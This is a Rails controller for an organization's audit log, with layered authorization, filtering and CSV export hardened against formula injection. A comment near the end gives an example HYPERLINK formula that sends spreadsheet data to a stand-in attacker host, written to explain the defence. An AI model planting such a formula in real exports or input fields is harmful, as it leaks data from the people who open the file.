class AuditEventsController < ApplicationController
  PER_PAGE = 50

  before_action :authenticate_user!
  before_action :set_org
  # Entitlement check renders the Team-feature paywall page if the org isn't
  # on Team. Runs BEFORE Pundit so non-Team users see a friendly upgrade
  # prompt instead of the generic "you're not authorized" redirect.
  before_action :require_audit_log_entitlement!
  after_action :verify_authorized

  def index
    # Authorization is layered for audit log access (see Phase 6 review):
    #   1. AuditEventPolicy#index? -- gates by audit-feature entitlement (Team)
    #      AND admin-or-higher membership.
    #   2. OrganizationPolicy#show? (fired by set_current_organization!) --
    #      ensures the user is still a member of this org (could revoke
    #      between steps).
    # Removing either check would weaken the gate. They are NOT redundant.
    authorize @organization, :index?, policy_class: AuditEventPolicy
    set_current_organization!(@organization)

    @entitlements = @organization.entitlements
    @events = filtered_scope.page(params[:page]).per(PER_PAGE)

    respond_to do |format|
      format.html
      format.csv do
        authorize @organization, :export?, policy_class: AuditEventPolicy
        send_data csv_export(filtered_scope),
          filename: "audit_log_#{@organization.id}_#{Date.current}.csv",
          type: "text/csv",
          disposition: "attachment"
      end
    end
  end

  private

  def set_org
    # Scope to memberships so non-member access returns 404 before the
    # feature-gate renders the paywall (which would echo org name + plan
    # tier into the DOM — a cross-org enumeration oracle otherwise).
    @organization = current_user.organizations.find(params[:organization_id])
  end

  def require_audit_log_entitlement!
    return if @organization.entitlements.audit_log_enabled?

    render_team_feature_paywall!(
      name: "Audit Log",
      icon: "fa-shield-halved",
      description: "Track every sensitive action across your organization in real-time, with searchable history and CSV export for compliance.",
      bullets: [
        "Member invites, role changes, and removals",
        "API token creation and revocation",
        "App Store / Google Play credential changes",
        "Plan upgrades, downgrades, and trial events",
        "Failed sign-in attempts (security alerts)",
        "Store pushes, submissions, and SSO logins",
        "Filter by actor, action, or date",
        "Export to CSV for compliance"
      ]
    )
  end

  def filtered_scope
    scope = @organization.audit_events.recent.includes(:actor)

    scope = scope.for_actor(params[:actor_id]) if params[:actor_id].present?
    scope = scope.for_action(params[:action_filter]) if params[:action_filter].present?

    if params[:from].present? && params[:to].present?
      from = safe_parse_date(params[:from])
      to = safe_parse_date(params[:to])
      scope = scope.in_date_range(from, to) if from && to
    end

    scope
  end

  def safe_parse_date(value)
    Date.parse(value.to_s)
  rescue ArgumentError, TypeError
    nil
  end

  def csv_export(scope)
    require "csv"
    CSV.generate(headers: true) do |csv|
      csv << [ "Time (UTC)", "Actor", "Action", "Resource Type", "Resource ID", "IP Address", "Metadata" ]
      scope.find_each do |event|
        csv << [
          safe_csv_cell(event.created_at.utc.iso8601),
          safe_csv_cell(event.actor_display),
          safe_csv_cell(event.action),
          safe_csv_cell(event.resource_type),
          safe_csv_cell(event.resource_id),
          safe_csv_cell(event.ip_address),
          safe_csv_cell(event.metadata.to_json)
        ]
      end
    end
  end

  # Defends against CSV formula injection (OWASP cheatsheet). Excel, Numbers,
  # and LibreOffice interpret cell values starting with =, +, -, @, \t, or \r
  # as formulas. A user named `=HYPERLINK("http://evil.example/?c="&A1,"click")`
  # would execute when an admin opens the exported CSV. Prefixing with a single
  # quote forces the spreadsheet app to treat the cell as a literal string.
  #
  # Applied to every cell (not only known-user-input ones) so future columns
  # that become user-derived don't introduce regressions.
  def safe_csv_cell(value)
    str = value.to_s
    return "'#{str}" if str.match?(/\A[=+\-@\t\r]/)
    str
  end
end
